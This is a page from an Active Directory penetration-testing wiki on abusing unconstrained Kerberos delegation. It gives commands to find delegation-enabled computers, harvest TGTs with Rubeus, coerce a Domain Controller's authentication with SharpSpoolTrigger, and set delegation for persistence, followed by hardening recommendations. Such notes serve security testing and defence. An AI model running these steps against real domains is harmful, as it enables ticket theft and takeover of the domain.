---
layout: default
title: Unconstrained Delegation
parent: Active Directory
nav_order: 1
permalink: /ad/unconstrained/
---

# Unconstrained Delegation
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Unconstrained delegation allows a machine to act on behalf of **any user** for **any service**. If you compromise a machine that can perform unconstrained delegation, you can leverage this feature to escalate your privileges.

{: .important }
> Unconstrained delegation **only** works with Kerberos authentication.

## Prerequisites

* Having compromised a domain joined computer with unconstrained delegation allowed.

## Exploit

```powershell
# Look for vulnerable domain computers.
.\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# From your target, initiate any interaction with the server trusted for delegation that involves Kerberos authentication.
dir \\$server\c$

# On the compromised domain computer, list Kerberos TGTs.
.\Rubeus.exe triage
```

Another way to perform this attack is to force your target (let's say a Domain Controller) to authenticate on the server you compromised. To do so, you can use [SharpSpoolTrigger](https://github.com/cube0x0/SharpSystemTriggers). It will force the authentication and you could therefore capture the Kerberos TGT with [Rubeus](https://github.com/GhostPack/Rubeus).

```powershell
# Capture Kerberos tickets every 10 seconds on the computer you compromised.
.\Rubeus.exe monitor /interval:10 /nowrap

# Listener is the host on which you are monitoring Kerberos tickets with Rubeus.
.\SharpSpoolTrigger.exe $target $listener
```

You can then perform [Pass the Ticket](/ad/passtheticket/) with listed Kerberos TGTs.

{: .important }
> If you managed to perform the second method an to get the Domain Controller TGT, **congratulations** you are Domain Admin.

## Persistence

Allowing delegation for a domain computer requires *SeEnableDelegationPrivilege*, that is by default granted to Domain Admins and Enterprise Admins only. If you are Domain Admin, you can grant this privilege to any user, or enable delegation for any computer.

```powershell
# Enable unconstrained delegation for a domain joined computer.
$Computer = Get-ADComputer -Identity "$ComputerName"
$Computer.TrustedForDelegation = $True
Set-ADComputer -Instance $Computer
```

## Recommendations

- [ ] Avoid using unconstrained delegation, use [constrained delegation](/ad/constrained/) or [resource-based constrained delegation](/ad/rbconstrained) instead.
- [ ] Enforce *Account is sensitive and cannot be delegated* for privileged domain users.
- [ ] Limit services on which privileged domain users can authenticate to avoid caching Kerberos tickets.